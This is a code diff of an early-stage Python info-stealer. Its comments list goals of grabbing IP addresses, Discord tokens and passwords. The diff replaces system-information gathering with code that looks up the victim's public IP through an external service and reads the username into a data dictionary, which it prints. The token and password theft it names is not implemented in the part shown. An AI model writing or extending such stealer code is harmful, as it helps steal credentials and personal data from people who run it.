@@ -4,35 +4,28 @@
 #def ip: try to get ip
 #def discord: try to get discord tokens
 #def passwords: try to get passwords
-import platform
-import psutil # dependency
-from datetime import datetime
-def get_size(bytes, suffix="B"):
-    factor = 1024
-    for unit in ["", "K", "M", "G", "T", "P"]:
-        if bytes < factor:
-            return f"{bytes:.2f}{unit}{suffix}"
-        bytes /= factor
-def pcinfo():
-    info = []
-    unname = platform.uname()
+import requests, json, getpass
+def ip():
     try:
-        #system info
-        info.append({unname.system})
-        info.append({unname.node})
-        info.append({unname.release})
-        info.append({unname.version})
-        info.append({unname.machine})
-        info.append({unname.processor})
-        # date and time pc was booted 
-        boot_time_timestamp = psutil.boot_time()
-        bt = datetime.fromtimestamp(boot_time_timestamp)
-        btt = f'{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}'
-        info.append(btt)
-        return info
-    except Exception as e:
-        return e
+        ip = requests.get('http://api.ipify.org/', timeout=3)
+        ip = ip.text
+        data['ip'] = ip
+    except:
+        data['ip'] = 'na'
+        pass        
+
+def pcinfo():
+    try:
+        data['pcinfo'] = getpass.getuser()
+    except:
+        pass
+
 if __name__ == "__main__":
-    data = []
-    data.append(pcinfo())
+    global data
+    data = {
+        "ip": "",
+        "pcinfo": ""
+    }
+    ip()
+    pcinfo()
     print(data)
